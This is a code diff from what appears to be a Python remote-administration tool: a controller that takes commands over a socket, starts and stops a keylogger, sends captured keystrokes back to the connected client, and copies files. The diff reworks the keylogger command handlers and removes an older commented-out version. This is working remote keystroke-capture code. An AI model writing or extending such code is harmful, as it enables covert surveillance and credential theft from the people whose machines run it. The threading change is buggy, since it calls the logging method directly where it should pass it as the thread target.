@@ -120,30 +120,24 @@ class SV_Controller:
                             break
 
                 #5. Key Logger
-                elif command.startswith("START_KEYLOGGER"):
-                    self.model.start_keylogging(client_socket)
+                elif command == "START_KEYLOGGER":
+                    if not self.model.is_logging:
+                        thread = threading.Thread(target=self.model.start_keylogging())
+                        thread.daemon = True
+                        thread.start()
+                    self.model.start_keylogging()
                     
-                elif command.startswith("STOP_KEYLOGGER"):
-                    self.model.stop_keylogging(client_socket)
-                    keys = self.model.fetch_keys()
-                    self.model.send_command(client_socket, ",".join(keys).encode("utf-8"))
-                             
-                elif command.startswith("FETCH_KEYLOGGER"):
-                    self.model.fetch_keylogger(client_socket)
-                    self.model.send_command(client_socket, ",".join(keys).encode("utf-8"))
+                elif command == "STOP_KEYLOGGER":
+                    self.model.stop_keylogging()
+                    keys = self.model.fetch_keylogger()
+                    self.model.send_command(client_socket, keys)
+                    
+                elif command == "FETCH_KEYLOGGER":
+                    keys = self.model.fetch_keylogger()
+                    print(keys)
+                    self.model.send_command(client_socket, keys)
                     
                 
-                # elif command == "START_KEYLOGGER":
-                #     listener = self.model.start_keylogger()
-                #     self.model.send_command(client_socket, "Keylogger started.")
-                #     # Listen for stop command
-                #     while True:
-                #         stop_command = self.model.receive_response(client_socket)
-                #         if stop_command == "STOP_KEYLOGGER":
-                #             result = self.model.stop_keylogger(listener)
-                #             self.model.send_command(client_socket, result)
-                #             break
-
                 #6. Del va Copy
                 if command.startswith("COPY_FILE"):
                     file_path = command.split(" ", 1)[1]
